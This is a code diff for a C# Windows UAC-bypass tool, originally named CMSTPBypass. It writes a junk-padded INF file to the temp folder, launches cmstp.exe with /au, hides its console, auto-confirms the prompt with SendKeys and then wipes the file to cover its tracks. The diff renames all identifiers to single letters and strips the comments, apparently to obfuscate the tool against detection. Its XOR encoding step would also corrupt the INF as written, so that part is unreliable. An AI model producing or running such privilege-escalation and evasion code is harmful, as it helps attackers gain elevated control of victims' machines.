@@ -6,29 +6,25 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Windows.Forms;
 
-public class CMSTPBypass
+public class Program
 {
-    // XOR encryption key
-    private const byte XorKey = 0x55; // Change this key as needed
-
-    // Function to obfuscate INF data using XOR
-    public static string ObfuscateInfData(string originalInfData)
+    // Obfuscate INF data using XOR
+    public static string a(string A)
     {
-        byte[] infBytes = Encoding.UTF8.GetBytes(originalInfData);
+        byte[] B = Encoding.UTF8.GetBytes(A);
 
-        for (int i = 0; i < infBytes.Length; i++)
+        for (int i = 0; i < B.Length; i++)
         {
-            infBytes[i] = (byte)(infBytes[i] ^ XorKey);
+            B[i] = (byte)(B[i] ^ 0x55);
         }
 
-        return Encoding.UTF8.GetString(infBytes);
+        return Encoding.UTF8.GetString(B);
     }
 
-    // Function to deobfuscate INF data using XOR
-    public static string DeobfuscateInfData(string obfuscatedInfData)
+    // Deobfuscate INF data using XOR
+    public static string b(string A)
     {
-        // Deobfuscation is the same as obfuscation because XOR is symmetric
-        return ObfuscateInfData(obfuscatedInfData);
+        return a(A);
     }
 
     [DllImport("user32.dll")]
@@ -36,15 +32,13 @@ public class CMSTPBypass
     [DllImport("user32.dll", SetLastError = true)]
     public static extern bool SetForegroundWindow(IntPtr hWnd);
 
-    public const string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
+    public const string C = "c:\\windows\\system32\\cmstp.exe";
 
-    public static void Main(string[] args)
+    public static void Main(string[] D)
     {
-        // Replace with the actual command you want to execute for process ghosting
-        string commandToExecute = "runlegacyexplorer.exe"; // Execute the alternative Explorer.exe
+        string E = "runlegacyexplorer.exe";
 
-        // Original INF data
-        const string InfData = @"
+        const string F = @"
 [version]
 Signature=$chicago$
 AdvancedINF=2.5
@@ -68,89 +62,81 @@ ServiceName=""CorpVPN""
 ShortSvcName=""CorpVPN""
 ";
 
-        // Obfuscate the .INF data
-        string obfuscatedInfData = ObfuscateInfData(InfData);
+        string G = a(F);
 
-        Execute(commandToExecute, obfuscatedInfData);
+        H(E, G);
     }
 
-    public static void Execute(string commandToExecute, string obfuscatedInfData)
+    public static void H(string I, string J)
     {
-        if (!File.Exists(BinaryPath))
-        {
-            Console.WriteLine("Could not find cmstp.exe binary!");
-            return;
-        }
+        if (!File.Exists(C)) return;
 
-        IntPtr consoleWindow = GetConsoleWindow();
-        ShowWindow(consoleWindow, 0);
+        IntPtr K = GetConsoleWindow();
+        ShowWindow(K, 0);
 
-        // Perform the kill operation first
-        ProcessStartInfo killStartInfo = new ProcessStartInfo("taskkill")
+        ProcessStartInfo L = new ProcessStartInfo("taskkill")
         {
             Arguments = "/F /IM cmstp.exe",
             UseShellExecute = false,
             CreateNoWindow = true
         };
-        Process.Start(killStartInfo);
+        Process.Start(L);
 
-        string infFilePath = SetInfFile(commandToExecute, obfuscatedInfData);
+        string M = N(I, J);
 
-        Console.WriteLine("Obfuscated payload file written to " + infFilePath);
+        Console.WriteLine("Obfuscated payload file written to " + M);
 
-        ProcessStartInfo cmstpStartInfo = new ProcessStartInfo(BinaryPath)
+        ProcessStartInfo O = new ProcessStartInfo(C)
         {
-            Arguments = "/au " + infFilePath,
+            Arguments = "/au " + M,
             UseShellExecute = false
         };
-        Process.Start(cmstpStartInfo);
+        Process.Start(O);
 
-        IntPtr windowHandle = IntPtr.Zero;
+        IntPtr P = IntPtr.Zero;
         do
         {
-            windowHandle = SetWindowActive("cmstp");
-        } while (windowHandle == IntPtr.Zero);
+            P = Q("cmstp");
+        } while (P == IntPtr.Zero);
 
         SendKeys.SendWait("{ENTER}");
 
-        // Clean up and cover tracks
-        CleanUp(infFilePath);
+        R(M);
     }
 
-    public static IntPtr SetWindowActive(string processName)
+    public static IntPtr Q(string S)
     {
-        Process[] target = Process.GetProcessesByName(processName);
-        if (target.Length == 0) return IntPtr.Zero;
-        target[0].Refresh();
-        IntPtr windowHandle = target[0].MainWindowHandle;
-        if (windowHandle == IntPtr.Zero) return IntPtr.Zero;
-        SetForegroundWindow(windowHandle);
-        ShowWindow(windowHandle, 5);
-        return windowHandle;
+        Process[] T = Process.GetProcessesByName(S);
+        if (T.Length == 0) return IntPtr.Zero;
+        T[0].Refresh();
+        IntPtr U = T[0].MainWindowHandle;
+        if (U == IntPtr.Zero) return IntPtr.Zero;
+        SetForegroundWindow(U);
+        ShowWindow(U, 5);
+        return U;
     }
 
-    public static string SetInfFile(string commandToExecute, string obfuscatedInfData)
+    public static string N(string I, string J)
     {
-        string randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
-        string temporaryDir = "C:\\windows\\temp";
-        StringBuilder outputFile = new StringBuilder();
-        outputFile.Append(temporaryDir);
-        outputFile.Append("\\");
-        outputFile.Append(randomFileName);
-        outputFile.Append(".inf");
+        string V = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
+        string W = "C:\\windows\\temp";
+        StringBuilder X = new StringBuilder();
+        X.Append(W);
+        X.Append("\\");
+        X.Append(V);
+        X.Append(".inf");
 
-        int junkDataSize = 1024; // Adjust the size of junk data as needed
-        byte[] junkData = new byte[junkDataSize];
-        new Random().NextBytes(junkData);
-        File.WriteAllBytes(outputFile.ToString(), junkData);
+        int Y = 1024;
+        byte[] Z = new byte[Y];
+        new Random().NextBytes(Z);
+        File.WriteAllBytes(X.ToString(), Z);
 
-        // Append the obfuscated INF content
-        File.AppendAllText(outputFile.ToString(), obfuscatedInfData.Replace("REPLACE_COMMAND_LINE", commandToExecute));
+        File.AppendAllText(X.ToString(), J.Replace("REPLACE_COMMAND_LINE", I));
 
-        return outputFile.ToString();
+        return X.ToString();
     }
 
-    public static void CleanUp(string filePath)
+    public static void R(string filePath)
     {
         byte[] randomData = new byte[1024];
         using (var rng = new RNGCryptoServiceProvider())
